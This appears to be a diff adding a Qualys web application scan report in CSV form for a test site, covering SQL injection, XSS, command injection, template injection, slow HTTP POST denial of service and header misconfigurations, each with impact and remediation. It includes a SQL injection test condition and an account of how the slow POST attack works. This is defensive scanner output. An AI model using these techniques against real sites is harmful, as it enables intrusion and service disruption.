+<P>In the first case the database will return <I>""John""</I> since the condition <B>AND 1=1</B> is always true.","The scope of a SQL injection exploit varies greatly. If any SQL statement can be injected into the query, then the attacker has the equivalent access of a database administrator. This access could lead to theft of data, malicious corruption of data, or deletion of data.","SQL injection vulnerabilities can be addressed in three areas: input validation, query creation, and database security.
+<P>
+All input received from the web client should be validated for correct content. If a value's type or content range is known beforehand, then stricter filters should be applied. For example, an email address should be in a specific format and only contain characters that make it a valid address; or numeric fields like a USA zip code should be limited to five digit values.
+<P>
+Prepared statements (sometimes referred to as parameterized statements) provide strong protection from SQL injection. Prepared statements are precompiled SQL queries whose parameters can be modified when the query is executed. Prepared statements enforce the logic of the query and will fail if the query cannot be compiled correctly. Programming languages that support prepared statements provide specific functions for creating queries. These functions are more secure than string concatenation for assigning user-supplied data to a query.
+<P>
+Stored procedures are precompiled queries that reside in the database. Like prepared statements, they also enforce separation of query data and logic. SQL statements that call stored procedures should not be created via string concatenation, otherwise their security benefits are negated.
+<P>
+SQL injection exploits can be mitigated by the use of Access Control Lists or role-based access within the database. For example, a read-only account would prevent an attacker from modifying data, but would not prevent the user from viewing unauthorized data. Table and row-based access controls potentially minimize the scope of a compromise, but they do not prevent exploits.
+<P>
+Example of a secure query created with a prepared statement:
+<BR>
+<CODE>
+PreparedStatement ps = ""SELECT name,email FROM users WHERE userid=?"";
+ps.setInt(1, userid);
+</CODE>"
+"QID","150013","Browser-Specific Cross-Site Scripting (XSS) Vulnerabilities","Confirmed Vulnerability","5","XSS","A7","WASC-8","CWE-79","4.3","4.3","XSS vulnerabilities occur when the Web application echoes user-supplied data in an HTML response sent to the Web browser. For example, a Web application might include the user's name as part of a welcome message or display a home address when confirming a shipping destination. If the user-supplied data contains characters that are interpreted as part of an HTML element instead of literal text, then an attacker can modify the HTML that is received by the victim's Web browser.
+<P>
+The XSS payload is echoed in the HTML document returned by the request. An XSS payload may consist of HTML, JavaScript or other content that will be rendered by the browser. In order to exploit this vulnerability, a malicious user would need to trick a victim into visiting the URL with the XSS payload.
+<P>
+Note! This specific test uses an XSS payload that takes advantage of Mozilla's HTML parsing engine. Manual confirmation of this vulnerability should use the Mozilla browser. Even though this exploits a particular Web browser, the Web application still has inadequate input filters.","XSS exploits pose a significant threat to a Web application, its users and user data. XSS exploits target the users of a Web application rather than the Web application itself. An exploit can lead to theft of the user's credentials and personal or financial information. Complex exploits and attack scenarios are possible via XSS because it enables an attacker to execute dynamic code in the victim's Web browser. Consequently, any capability or feature available to the Web browser (for example HTML, JavaScript, Flash, and Java applets) can be used as part of a compromise.","Filter all data collected from the client including user-supplied content and browser content such as Referrer and User-Agent headers.
+<P>
+Any data collected from the client and displayed in a Web page should be HTML-encoded to ensure the content is rendered as text instead of an HTML element or JavaScript."
+"QID","150021","Scan Diagnostics","Information Gathered","1","","","","",,,"This check provides various details of the scan's performance and behavior. In some cases, this check can be used to identify problems that the scanner encountered when crawling the target Web application.","The scan diagnostics data provides technical details about the crawler's performance and behavior. This information does not necessarily imply problems with the Web application.","No action is required."
+"QID","150022","Verbose Error Message","Confirmed Vulnerability","3","INFO","A6","WASC-15","CWE-209","5.0","4.0","A verbose error message was encountered during the scan.","Verbose error messages often expose technical details that are helpful to attackers. Verbose errors can allow attackers to learn ""inside"" information about the application and/or hosting infrastructure, allowing them to target it more effectively.","Implement strong error and exception handling to ensure that the web application displays only generic error messages. Avoid returning stack traces, debugging information, or other technical details to the client side.  The application should also implement rigorous input data validation. Restrict user-supplied data to consist of a minimal set of characters necessary for the input field and validate the data to ensure it conforms to the expected format."
+"QID","150023","Directory Listing","Confirmed Vulnerability","2","PATH","A5,A6","WASC-16","CWE-548","5.0","4.5","The Web server presents a directory listing.","All file names in this directory are exposed.","The presence of a browseable directory does not necessarily imply a vulnerability. Determine if the directory listing is intended to be displayed. Verify that no files in the directory contain content that should not be served by the Web application."
+"QID","150028","Cookies Collected","Information Gathered","1","","","","",,,"The cookies listed in the Results section were received from the web application during the crawl phase.","Cookies may contain sensitive information about the user. Cookies sent via HTTP may be sniffed.","Review cookie values to ensure that sensitive information such as passwords are not present within them."
+"QID","150053","Login Form Is Not Submitted Via HTTPS ","Confirmed Vulnerability","4","INFO","A2,A3","WASC-4","CWE-523","8.5","7.2","The login form's default action contains a link that is not submitted via HTTPS (HTTP over SSL).","Sensitive data such as authentication credentials should be encrypted when transmitted over the network. Otherwise they are exposed to sniffing attacks.","Change the login form's action to submit via HTTPS."
+"QID","150054","Email Addresses Collected","Information Gathered","1","INFO","","","",,,"The email addresses listed in the Results section were collected from the returned HTML content during the crawl phase.","Email addresses may help a malicious user with brute force and phishing attacks.","Review the email list to see if they are all email addresses you want to expose."
+"QID","150055","PHP Command Injection","Confirmed Vulnerability","5","INFO","A1","WASC-31,WASC-40","CWE-78","7.5","7.1","System commands can be executed via unchecked variables when a variable's value is passed to a PHP function like exec(), passthru(), pcntl_exec(), popen(), system(), or the backtick operator. A malicious user could create run shells commands on the web server by injecting appropriate characters into an input value used by one of these functions.","A malicious user who is able to run shell commands on the web server would be able to severely compromise source code, customer data, and the server.","Highly sensitive functions like exec(), passthru(), pcntl_exec(), popen(), system(), and the backtick operator should be avoided whenever possible. If these functions are necessary within the web application and they rely on user-supplied values, then the input should be strictly validated against a set of permitted characters or strings.
+<P>
+The escapeshellarg() and escapeshellcmd() functions should be used to validate and secure user-supplied data to system functions called by PHP."
+"QID","150059","Reference to Windows file path is present in HTML","Potential Vulnerability","1","INFO","A6","WASC-13","CWE-201","5.0","3.8","Windows specific file path was detected in the response.","The response may be an error response that disclosed a local file path. This may potentially be a sensitive information.","The content should be reviewed to determine whether it could be masked or removed."
+"QID","150066","Summary of .NET ViewState Fields","Information Gathered","1","","","","",,,"One or more forms were detected that include a .NET ViewState field. Descriptive information about these fields is included in the Results section.","No specific security concerns are raised by this information. In general, the use of ViewState fields should be reviewed to ensure that they are implemented correctly within server-side code. ViewState objects should be encrypted or include an HMAC to prevent tampering. ViewState objects should not contain unnecessary static content that would make the field size large and therefore negatively impact performance.","This data is provided merely as feedback about the Web site. No further action is required."
+"QID","150081","X-Frame-Options header is not set","Potential Vulnerability","1","INFO","A6","WASC-15","CWE-693","5.0","4.1","The X-Frame-Options header is not set in the HTTP response, which may lead to a possible framing of the page.
+An attacker can trick users into clicking on a malicious link by framing the original page and showing a layer on top of it with legitimate-looking buttons.
+","Attacks such as Clickjacking could potentially be performed.
+","The ""X-Frame-Options:"" allows three options DENY, SAMEORIGIN and ALLOW-FROM. It is recommended to set ""X-FRAME-OPTIONS to DENY"" which won't allow any domain to frame the site or SAMEORIGIN which only allows framing by the same site. DENY and SAMEORGIN are supported by all browsers.
+
+Setting ""X-FRAME-OPTIONS"" to ALLOW-FROM may still leave users vulnerable to Clickjacking since not all browsers support ALLOW-FROM including CHROME and SAFARI.
+For more information, see https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet.
+For more common X-FRAME-OPTION implementations errors please visit the link below: 
+https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger
+"
+"QID","150084","Unencoded characters ","Potential Vulnerability","1","XSS","A7","WASC-22","CWE-79",,,"The web application reflects potentially dangerous characters such as single quotes, double quotes, and angle brackets. These characters are commonly used for HTML injection attacks such as cross-site scripting (XSS).","No exploit was determined for these reflected characters. The input parameter should be manually analyzed to verify that no other characters can be injected that would lead to an HTML injection (XSS) vulnerability.","Review the reflected characters to ensure that they are properly handled as defined by the web application's coding practice. Typical solutions are to apply HTML encoding or percent encoding to the characters depending on where they are placed in the HTML. For example, a double quote might be encoded as "" when displayed in a text node, but as %22 when placed in the value of an href attribute."
+"QID","150085","Slow HTTP POST vulnerability","Potential Vulnerability","3","INFO","A6","WASC-10","CWE-772","6.8","6.1","The web application is possibly vulnerable to a ""slow HTTP POST"" Denial of Service (DoS) attack. This is an application-level DoS that consumes server resources by maintaining open connections for an extended period of time by slowly sending traffic to the server. If the server maintains too many connections open at once, then it may not be able to respond to new, legitimate connections. Unlike bandwidth-consumption DoS attacks, the ""slow"" attack does not require a large amount of traffic to be sent to the server -- only that the client is able to maintain open connections for several minutes at a time.
+<P>
+The attack holds server connections open by sending properly crafted HTTP POST headers that contain a Content-Length header with a large value to inform the web server how much of data to expect. After the HTTP POST headers are fully sent, the HTTP POST message body is sent at slow speeds to prolong the completion of the connection and lock up server resources. By waiting for the complete request body, the server is helping clients with slow or intermittent connections to complete requests, but is also exposing itself to abuse.
+<P>
+Further information can be found under <A HREF=""https://media.blackhat.com/bh-dc-11/Brennan/BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf"" TARGET=""_blank"">BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf</A>. ","All other services remain intact but the web server itself becomes inaccessible.","Solution would be server-specific, but general recommendations are:
+- to limit the size of the acceptable request to each form requirements
+- establish minimal acceptable speed rate
+- establish absolute request timeout for connection with POST request
+Server-specific details can be found <A HREF=""https://community.qualys.com/blogs/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks"" TARGET=""_blank"">here</A>. 
+A tool that demonstrates this vulnerability in a more intrusive manner is available <A HREF=""https://github.com/shekyan/slowhttptest"" TARGET=""_blank"">here</A>."
+"QID","150087","Web Service Found","Information Gathered","1","","","","",,,"The list of links with Web Service descriptions was found during the crawling or by brute forcing. List of Web Services is included with every discovered Web Service description.
+
+","N/A","N/A"
+"QID","150099","Cookies Issued Without User Consent","Information Gathered","1","","","","",,,"The cookies listed in the Results section were issued from the web
+application during the crawl without accepting any opt-in dialogs.","Cookies may be set without user explicitly agreeing to accept them.","Review the application to ensure that all cookies listed are supposed to be issued without user opt-in.  If the EU Cookie law is applicable for this web application, ensure these cookies require user opt-in or have been classified as exempt by your organization."
+"QID","150101","Third-party Cookies Collected","Information Gathered","1","","","","",,,"The cookies listed in the Results section were received from third-party web application(s) during the crawl phase.","Cookies may contain sensitive information about the user. Cookies sent via HTTP may be sniffed.","Review cookie values to ensure that sensitive information such as passwords are not present within them."
+"QID","150104","Form Contains Email Address Field","Information Gathered","1","INFO","","","",,,"The HTML form contains a field that collects an email address.","In some web apps, forms that collect email addresses also generate messages to back-end systems whenever the form is submitted. If no rate limiting or CAPTCHA is applied to form submissions, then vulnerability tests against this form may produce a significant amount of messages. If too many messages are generated, then it may produce a Denial of Service situation.","Review the form to determine if it produces an email message each time it is submitted. If so, consider blacklisting this form from being tested or disable the messaging during the web application scan.
+
+Forms that generate messages can be abused by malicious users to create Denial of Service attacks. Apply rate limiting to the form in order to throttle the number of times it may be submitted by a user or by an IP address; or apply a CAPTCHA to it to reduce the chance of automated tools being used against the form."
+"QID","150112","Sensitive form field has not disabled autocomplete","Confirmed Vulnerability","2","INFO","A6","WASC-13","CWE-200",,,"An HTML form that collects sensitive information does not prevent the browser from prompting the user to save the populated values for later reuse. 
+Autocomplete should be turned off for any input that takes sensitive information such as credit card number, CVV2/CVC code, U.S. social security number, etc.","If the browser is used in a shared computing environment where more than one person may use the browser, then ""autocomplete"" values may be submitted by an unauthorized user. ","Add the following attribute to the form or input element: autocomplete=""off"" 
+This attribute prevents the browser from prompting the user to save the populated form values for later reuse. 
+Most browsers no longer honor autocomplete=""off"" for password input fields. 
+These browsers include  
+Chrome, Firefox, Microsoft Edge, IE, Opera
+However, there is still an ability to turn off autocomplete through the browser and that is recommended for a shared computing environment.
+Since the ability to turn autocomplete off for password inputs fields is controlled by the user it is highly recommended for application to enforce strong password rules."
+"QID","150115","Authentication Form found","Information Gathered","1","","","","",,,"Authentication Form was found during the web application crawling.","N/A","N/A"
+"QID","150123","Cookie Does Not Contain The ""HTTPOnly"" Attribute","Confirmed Vulnerability","2","INFO","A3","WASC-4","CWE-1004",,,"The cookie does not contain the ""HTTPOnly"" attribute.","Cookies without the ""HTTPOnly"" attribute are permitted to be accessed via JavaScript. Cross-site scripting attacks can steal cookies which could lead to user impersonation or compromise of the application account.","If the associated risk of a compromised account is high, apply the ""HTTPOnly"" attribute to cookies."
+"QID","150124","Clickjacking - Framable Page","Confirmed Vulnerability","3","INFO","A6","WASC-15","CWE-451","6.4","5.8","The web page can be framed. This means that clickjacking attacks against users are possible.
+","With clickjacking, an attacker can trick a victim user into clicking an invisible frame on the web page, thereby causing the victim to take an action they did not intend to take.
+
+","Common clickjacking prevention mechanisms include:
+<P>X-Frame-Options: This is an HTTP response header that is used to prevent framing of the web page.</P>
+<P>Framekiller JavaScript code: Special JS code can be used to prevent a malicious user from framing the page. This method is less reliable than using X-Frame-Options.</P>"
+"QID","150126","Links With High Resource Consumption","Information Gathered","1","INFO","","","",,,"The list of links with lowest bytes/sec which are assumed to be resources with  highest resource consumption.  The links in the list have slower transfer times speeds to an average resource on the server.  This may indicate that the links are more CPU or DB intensive than majority of links.<P>
+The latency of the network and file size have no effect on calculations.
+","The links with high resource consumption could be used to perform DOS on the server  by just performing GET Flooding. Attackers could more easily take the server down if there are huge resource hogs on it, performing less request.
+","Find the root cause of resources slow download speed.  <P>
+If the cause is a real CPU strain or complex DB queries performed, there may be a need for re-engineering of the web application or defense measures should be in place.  Examples of defense against DOS that is targeted towards high resource consumption links are Load Balancers and Rate Limiters."
+"QID","150142","Virtual Host Discovered","Information Gathered","1","INFO","","","",,,"Web server is responding differently when the HOST header is manipulated and various common virtual hosts are tested. This could indicate the presence of Virtual Host.
+
+Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). This allows one server to share its resources, such as memory and processor cycles, without requiring all services provided to use the same host name.
+
+The extra virtual hosts discovered by the Web application scanner during HOST header manipulation are provided in the Results section.","The Web application should apply consistent security measures. If the Web application fails to apply security controls to other domains hosted on the same server, then it may be exposed to vulnerabilities like cross-site scripting, SQL injection, or authorization-based attacks.","Consult the virtual host configuration and check if this virtual host should be publicly accessible."
+"QID","150152","Forms Crawled","Information Gathered","1","","","","",,,"Results section consists of the unique forms submitted by the Web Application Scanner. Reported list of forms in this QID does not contain authentication forms (i.e. login forms) which are reported separately in QID 150115. There is redundancy checks done on forms based on form fields. Forms determined to be similar will be considered redundant and not tested. 
+<P>NOTE: The regular expression specified under 'Redundant Links' are not applied to forms. Forms (unique or redundant) are not reported under QID 150140.","N/A","N/A"
+"QID","150159","Session Cookie Set over Non-HTTPS Connection","Confirmed Vulnerability","2","INFO","A3","WASC-4","CWE-319","5.5","5.0","Session cookie set over Non-HTTPS connection","Session cookie set over Non-HTTPS connection can lead to a Man in the Middle attack and cookie data can be stolen. Cookie values can be sniffed by an attacker. This later can be used to impersonate the authenticated user and gain unauthorized access."," The general recommendation is to set the Session cookie over HTTPS (secure connection)"
+"QID","150162","Use of JavaScript Library with Known Vulnerability","Confirmed Vulnerability","3","INFO","A9","","CWE-937","6.4","4.9","The web application is using one or more JavaScript libraries which contain a known vulnerability.","Attackers could exploit the vulnerabilities in the JavaScript libraries. The exact ability to exploit and impact depends on the component(s) and usage of the vulnerable libraries by the web application.","Please refer to vendor's security advisories related to the vulnerable version of the library."
+"QID","150169","Data URI Discovered Over Non-HTTPS Links","Information Gathered","1","","","","",,,"Data URIs were discovered on non-HTTPS pages in the target web application. Details are provided in the Results section.  Note that if same data URI was found on multiple pages, then the URL for only one page is reported.","Data URIs by themselves do not represent a vulnerability. However, data URIs served over a non-HTTPS connection are not completely trustworthy and could potentially be used to help in various attacks such as:
+<OL>
+<LI> Bypassing XSS filters.</LI>
+<LI> Creating legitimate-looking web pages for phishing purposes.</LI>
+<LI> Bypassing firewall-proxy restrictions that block certain media types, since data URIs support embedded MIME-type definitions.</LI>
+</OL>","Considering serving data URIs over secure HTTPS connections only."
+"QID","150176","JavaScript Libraries Detected","Information Gathered","1","INFO","","","",,,"The JavaScript libraries discovered by the Web Application Scanning engine are provided in the Results section. The discovered libraries are reported only once based on the page of the web application on which they were first detected.
+
+These libraries are reported along with other information such as: the page on which they were first found and their version and script uri.","N/A","N/A"
+"QID","150191","Server-Side Template Injection (SSTI)","Confirmed Vulnerability","5","INFO","A1","WASC-36","CWE-116,CWE-94,CWE-95","10.0","9.5","The target web application is vulnerable to Server-Side Template Injection (SSTI).
+
+SSTI occurs when unvalidated, user-controlled data is used to dynamically construct a server-side template.
+
+More information can be found at http://blog.portswigger.net/2015/08/server-side-template-injection.html","SSTI allows an attacker to run arbitrary template directives and commands on the server.  Dangerous attacks such as remote code execution and command injection could be performed.  Other potential attacks include cross-site scripting (XSS) and reading or modifying confidential data from the server's memory and/or file system.","Do not use untrusted, user-controlled data to construct server-side templates. If user-controlled data needs to be used with templates, always validate the input rigorously and pass it to the template via template parameters or template context.
+
+"
+"QID","150202","Missing header: X-Content-Type-Options","Information Gathered","2","INFO","A6","WASC-15","",,,"The X-Content-Type-Options response header is not present. WAS reports missing X-Content-Type-Options header on each crawled link with all types of static and dynamic response. The scanner performs the check on 4xx and 5xx responses too. It's possible to see a directory link reported for QID as well.","All web browsers employ a content-sniffing algorithm that inspects the contents of HTTP responses and also occasionally overrides the MIME type provided by the server. If X-Content-Type-Options header is not present, browsers can potentially be tricked into treating non-HTML response as HTML. An attacker can potentially leverage the functionality to perform a cross-site scripting (XSS) attack. This specific case is known as a Content-Sniffing XSS (CS-XSS) attack.
+
+
+
+","It is recommended to disable browser content sniffing by adding the X-Content-Type-Options header to the HTTP response with a value of 'nosniff'. Also ensure that the Content-Type header is set correctly on responses.
+"
+"QID","150204","Missing header: X-XSS-Protection","Information Gathered","1","INFO","A6","WASC-15","",,,"The X-XSS-Protection response header is not present.
+","The X-XSS-Protection response header provides a layer of protection against reflected cross-site scripting (XSS) attacks by instructing browsers to abort rendering a page in which a reflected XSS attack has been detected. This is a best-effort second line of defense measure which helps prevent an attacker from using evasion techniques to avoid the neutralization mechanisms that the filters use by default. When configured appropriately, browser-level XSS filters can provide additional layers of defense against web application attacks.
+<P>
+Note that HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security the X-XSS-Protection header should be set on 4xx and 5xx responses as well.","It is recommend to set X-XSS-Protection header with value set to '1; mode=block' on all the relevant responses to activate browser's XSS filter.
+
+<P><B>NOTE:</B> The X-XSS-Protection header is not supported by all browsers. Google Chrome and Safari are some of the browsers which support it, Firefox on the other hand does not support the header. X-XSS-Protection header does not guarantee a complete protection against XSS. For better protection against XSS attacks, the web application should use secure coding principles. Also, consider leveraging the Content-Security-Policy (CSP) header, which is supported by all browsers.
+
+<P>Using X-XSS-Protection could have unintended side effects, please understand the implications carefully before using it.
+
+<P>References:
+<BR>- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
+<BR>- https://blog.innerht.ml/the-misunderstood-x-xss-protection/
+<BR>- https://www.mbsd.jp/blog/20160407.html
+<BR>- https://www.chromium.org/developers/design-documents/xss-auditor"
+"QID","150205","Misconfigured header: X-XSS-Protection","Information Gathered","1","INFO","A6","WASC-15","",,,"The X-XSS-Protection response header is present, but its specified value does not provide adequate protection against reflected cross-site scripting (XSS) attacks.","The X-XSS-Protection response header provides a layer of protection against reflected cross-site scripting (XSS) attacks by instructing browsers to abort rendering a page in which a reflected XSS attack has been detected. This is a best-effort second line of defense measure which helps prevent an attacker from using evasion techniques to avoid the neutralization mechanisms that the filters use by default. When configured appropriately, browser-level XSS filters can provide additional layers of defense against web application attacks.
+
+<P>Note that HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security the X-XSS-Protection header should be set on 4xx and 5xx responses as well.","It is recommended to set X-XSS-Protection header with a value of '1; mode=block' on all relevant responses to activate the browser's XSS filter.
+ 
+<P><B>NOTE:</B> The X-XSS-Protection header is not supported by all browsers. Google Chrome and Safari are some of the browsers which support it, Firefox does not support the header. X-XSS-Protection header does not guarantee complete protection against XSS. For better protection against XSS attacks, the web application should use secure coding principles. Also, consider leveraging the Content-Security-Policy (CSP) header, which is supported by all browsers.
+
+<P>Using X-XSS-Protection could have unintended side effects, please understand the implications carefully before using it.
+
+<P>References:
+<BR>- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
+<BR>- https://blog.innerht.ml/the-misunderstood-x-xss-protection/
+<BR>- https://www.mbsd.jp/blog/20160407.html
+<BR>- https://www.chromium.org/developers/design-documents/xss-auditor
+"
+"QID","150206","Content-Security-Policy Not Implemented","Information Gathered","2","INFO","A6","WASC-15","",,,"No Content-Security-Policy (CSP) is specified for the page. WAS checks for the missing CSP on all static and dynamic pages. It checks for CSP in the response headers (Content-Security-Policy, X-Content-Security-Policy or X-Webkit-CSP) and in response body (http-equiv=""Content-Security-Policy"" meta tag).
+<BR>
+<BR>
+HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security it's important to set appropriate CSP policies on 4xx and 5xx responses as well.
+","Content-Security Policy is a defense mechanism that can significantly reduce the risk and impact of XSS attacks in modern browsers. The CSP specification provides a set of content restrictions for web resources and a mechanism for transmitting the policy from a server to a client where the policy is enforced. When a Content Security Policy is specified, a number of default behaviors in user agents are changed; specifically inline content and JavaScript eval constructs are not interpreted without additional directives. In short, CSP allows you to create a whitelist of sources of the trusted content. The CSP policy instructs the browser to only render resources from those whitelisted sources. Even though an attacker can find a security vulnerability in the application through which to inject script, the script won't match the whitelisted sources defined in the CSP policy, and therefore will not be executed.
+<BR>
+<BR>
+The absence of Content Security Policy in the response will allow the attacker to exploit vulnerabilities as the protection provided by the browser is not at all leveraged by the Web application. If secure CSP configuration is not implemented, browsers will not be able to block content-injection attacks such as Cross-Site Scripting and Clickjacking.
+
+","Appropriate CSP policies help prevent content-injection attacks such as cross-site scripting (XSS) and clickjacking. It's recommended to add secure CSP policies as a part of a defense-in-depth approach for securing web applications.
+<BR>
+<BR>
+References: 
+<BR>- https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet
+<BR>- https://developers.google.com/web/fundamentals/security/csp/
+
+
+
+"
+"QID","150210","Information Disclosure via Response Header","Information Gathered","3","INFO","A6","WASC-15","",,,"HTTP response headers like 'Server', 'X-Powered-By', 'X-AspNetVersion', 'X-AspNetMvcVersion' could disclose information about the platform and technologies used by the website. The HTTP response include one or more such headers.","Value of the headers can be potentially used by attackers for fingerprinting and launching attacks specific to the technologies and versions used by the website. These response headers are not necessary for production sites and should be disabled.","Disable such headers, remove them from the response or make sure that the value does not contain information which can be used to fingerprint the website.
+
+"
+"GROUP","Name","Category"
+"GROUP","PATH","VULNERABILITY"
+"GROUP","CC","SENSITIVE_CONTENT"
+"GROUP","SSN-US","SENSITIVE_CONTENT"
+"GROUP","CUSTOM","SENSITIVE_CONTENT"
+"GROUP","XSS","VULNERABILITY"
+"GROUP","INFO","VULNERABILITY"
+"GROUP","SQL","VULNERABILITY"
+"OWASP","Code","Name"
+"OWASP","A1","Injection"
+"OWASP","A2","Broken Authentication"
+"OWASP","A3","Sensitive Data Exposure"
+"OWASP","A4","XML External Entities (XXE)"
+"OWASP","A5","Broken Access Control"
+"OWASP","A6","Security Misconfiguration"
+"OWASP","A7","Cross-Site Scripting (XSS)"
+"OWASP","A8","Insecure Deserialization"
+"OWASP","A9","Using Components with Known Vulnerabilities"
+"OWASP","A10","Insufficient Logging & Monitoring"
+"WASC","Code","Name"
+"WASC","WASC-1","INSUFFICIENT AUTHENTICATION"
+"WASC","WASC-2","INSUFFICIENT AUTHORIZATION"
+"WASC","WASC-3","INTEGER OVERFLOWS"
+"WASC","WASC-4","INSUFFICIENT TRANSPORT LAYER PROTECTION"
+"WASC","WASC-5","REMOTE FILE INCLUSION"
+"WASC","WASC-6","FORMAT STRING"
+"WASC","WASC-7","BUFFER OVERFLOW"
+"WASC","WASC-8","CROSS-SITE SCRIPTING"
+"WASC","WASC-9","CROSS-SITE REQUEST FORGERY"
+"WASC","WASC-10","DENIAL OF SERVICE"
+"WASC","WASC-11","BRUTE FORCE"
+"WASC","WASC-12","CONTENT SPOOFING"
+"WASC","WASC-13","INFORMATION LEAKAGE"
+"WASC","WASC-14","SERVER MISCONFIGURATION"
+"WASC","WASC-15","APPLICATION MISCONFIGURATION"
+"WASC","WASC-16","DIRECTORY INDEXING"
+"WASC","WASC-17","IMPROPER FILESYSTEM PERMISSIONS"
+"WASC","WASC-18","CREDENTIAL/SESSION PREDICTION"
+"WASC","WASC-19","SQL INJECTION"
+"WASC","WASC-20","IMPROPER INPUT HANDLING"
+"WASC","WASC-21","INSUFFICIENT ANTI-AUTOMATION"
+"WASC","WASC-22","IMPROPER OUTPUT HANDLING"
+"WASC","WASC-23","XML INJECTION"
+"WASC","WASC-24","HTTP REQUEST SPLITTING"
+"WASC","WASC-25","HTTP RESPONSE SPLITTING"
+"WASC","WASC-26","HTTP REQUEST SMUGGLING"
+"WASC","WASC-27","HTTP RESPONSE SMUGGLING"
+"WASC","WASC-28","NULL BYTE INJECTION"
+"WASC","WASC-29","LDAP INJECTION"
+"WASC","WASC-30","MAIL COMMAND INJECTION"
+"WASC","WASC-31","OS COMMANDING"
+"WASC","WASC-32","ROUTING DETOUR"
+"WASC","WASC-33","PATH TRAVERSAL"
+"WASC","WASC-34","PREDICTABLE RESOURCE LOCATION"
+"WASC","WASC-35","SOAP ARRAY ABUSE"
+"WASC","WASC-36","SSI INJECTION"
+"WASC","WASC-37","SESSION FIXATION"
+"WASC","WASC-38","URL REDIRECTOR ABUSE"
+"WASC","WASC-39","XPATH INJECTION"
+"WASC","WASC-40","INSUFFICIENT PROCESS VALIDATION"
+"WASC","WASC-41","XML ATTRIBUTE BLOWUP"
+"WASC","WASC-42","ABUSE OF FUNCTIONALITY"
+"WASC","WASC-43","XML EXTERNAL ENTITIES (XXE)"
+"WASC","WASC-44","XML ENTITY EXPANSION"
+"WASC","WASC-45","FINGERPRINTING"
+"WASC","WASC-46","XQUERY INJECTION"
+"WASC","WASC-47","INSUFFICIENT SESSION EXPIRATION"
+"WASC","WASC-48","INSECURE INDEXING"
+"WASC","WASC-49","INSUFFICIENT PASSWORD RECOVERY"
+"APPENDIX"
+"Scan Name","Reference","Start Date","End Date","Mode","Type","Web Application","Authentication Record","Profile","DNS Override","Scanner Appliance","Status","Authentication Status"
+"VulnWhisperer TestSparker & subdomains","was/1556070040671.1017741","24 Apr 2019 01:41AM GMT","24 Apr 2019 02:47AM GMT","Vulnerability","Manual","TestSparker","None","Initial WAS Options","","External (IP: 64.39.99.17, Scanner: 11.1.24-1, WAS: 6.6.41-1, Signatures: 2.4.589-2)","Finished","No Authentication specified"
+"Form Submission","Form Crawl Scope","Maximum links to test in scope","User Agent","Request Parameter Set","Document Type","SmartScan Support","SmartScan Depth","Timeout Error Threshold","Unexpected Error Threshold","Scan Intensity","Bruteforce Option","Detection Scope","Credit Card Numbers Search","Social Security Numbers (US) Search","Custom Sensitive Content Search","Custom Performance","# of HTTP Threads","Delay Between Requests (ms)"
+"Post & Get","Do not include form action URI in uniqueness calculation","300","","Initial Parameters","Ignore common binary files","Disabled","5","100","300","Low","Minimal","Core","Off","Off","Off","Pre-defined","",""
+"Web Application Name","URL","Owner","Scope","Operating System"
+"TestSparker","http://testsparker.com/","qmontal (vunwh3qm)","Limit to URL hostname and specified domains","Windows Vista / Windows 2008 / Windows 7 / Windows 2012 / Windows 8 / Windows 10"
+"Category","Severity","Level","Description"
+"Confirmed Vulnerability","1","Minimal","Basic information disclosure (e.g. web server type, programming language) might enable intruders to discover other vulnerabilities, but lack of this information does not make the vulnerability harder to find."
+"Confirmed Vulnerability","2","Medium","Intruders may be able to collect sensitive information about the application platform, such as the precise version of software used. With this information, intruders can easily exploit known vulnerabilities specific to software versions. Other types of sensitive information might disclose a few lines of source code or hidden directories."
+"Confirmed Vulnerability","3","Serious","Vulnerabilities at this level typically disclose security-related information that could result in misuse or an exploit. Examples include source code disclosure or transmitting authentication credentials over non-encrypted channels."
+"Confirmed Vulnerability","4","Critical","Intruders can exploit the vulnerability to gain highly sensitive content or affect other users of the web application. Examples include certain types of cross-site scripting and SQL injection attacks."
+"Confirmed Vulnerability","5","Urgent","Intruders can exploit the vulnerability to compromise the web application's data store, obtain information from other users' accounts, or obtain command execution on a host in the web application's architecture."
+"Potential Vulnerability","1","Minimal","Presence of this vulnerability is indicative of basic information disclosure (e.g. web server type, programming language) and might enable intruders to discover other vulnerabilities. For example in this scenario, information such as web server type, programming language, passwords or file path references can be disclosed."
+"Potential Vulnerability","2","Medium","Presence of this vulnerability is indicative of basic information disclosure (e.g. web server type, programming language) and might enable intruders to discover other vulnerabilities. For example version of software or session data can be disclosed, which could be used to exploit."
+"Potential Vulnerability","3","Serious","Presence of this vulnerability might give access to security-related information to intruders who are bound to misuse or exploit. Examples of what could happen if this vulnerability was exploited include bringing down the server or causing hindrance to the regular service."
+"Potential Vulnerability","4","Critical","Presence of this vulnerability might give intruders the ability to gain highly sensitive content or affect other users of the web application."
+"Potential Vulnerability","5","Urgent","Presence of this vulnerability might enable intruders to compromise the web application's data store, obtain information from other users' accounts, or obtain command execution on a host in the web application's architecture. For example in this scenario, the web application users can potentially be targeted if the application is exploited."
+"Sensitive Content","1","Minimal","Sensitive content was found in the web server response. During our scan of the site form(s) were found with field(s) for credit card number or social security number. This information disclosure could result in a confidentiality breach and could be a target for intruders. For this reason we recommend caution."
+"Sensitive Content","2","Medium","Sensitive content was found in the web server response. Specifically our service found a certain sensitive content pattern (defined in the option profile). This information disclosure could result in a confidentiality breach and could be a target for intruders. For this reason we recommend caution."
+"Sensitive Content","3","Serious","Sensitive content was found in the web server response - a valid social security number or credit card information. This infomation disclosure could result in a confidentiality breach, and it gives intruders access to valid sensitive content that could be misused."
+"Information Gathered","1","Minimal","Intruders may be able to retrieve sensitive information related to the web application platform."
+"Information Gathered","2","Medium","Intruders may be able to retrieve sensitive information related to internal functionality or business logic of the web application."
